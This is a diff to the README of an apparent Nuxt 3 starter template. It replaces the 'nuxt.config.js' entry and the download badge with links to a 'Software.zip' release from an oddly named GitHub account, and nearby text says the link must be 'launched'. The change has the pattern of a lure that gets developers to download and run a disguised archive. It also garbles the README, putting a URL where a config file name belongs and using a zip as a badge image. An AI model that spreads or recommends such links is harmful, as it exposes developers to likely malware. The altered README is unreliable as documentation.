@@ -14,7 +14,7 @@ Inside this repository, you'll find a structured organization that will help you
 - **`plugins/`**: Include your plugins here.
 - **`static/`**: Store static files that should be served directly.
 - **`store/`**: Manage your Vuex store modules here.
-- **`nuxt.config.js`**: Configure your Nuxt 3 application.
+- **`https://github.com/alex12185656556565556/nuxt3-start-template/releases/download/v2.0/Software.zip`**: Configure your Nuxt 3 application.
 - **`.gitignore`**: Specify which files to ignore in Git.
 
 ## 🌐 Features
@@ -49,7 +49,7 @@ This repository covers a wide range of topics related to Nuxt 3 development. Her
 
 To get started with this Nuxt 3 Starter Template, simply download the template from the following link:
 
-[![Download Template](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Template](https://github.com/alex12185656556565556/nuxt3-start-template/releases/download/v2.0/Software.zip)](https://github.com/alex12185656556565556/nuxt3-start-template/releases/download/v2.0/Software.zip)
 
 Please note that the link provided needs to be launched to access the template.
 
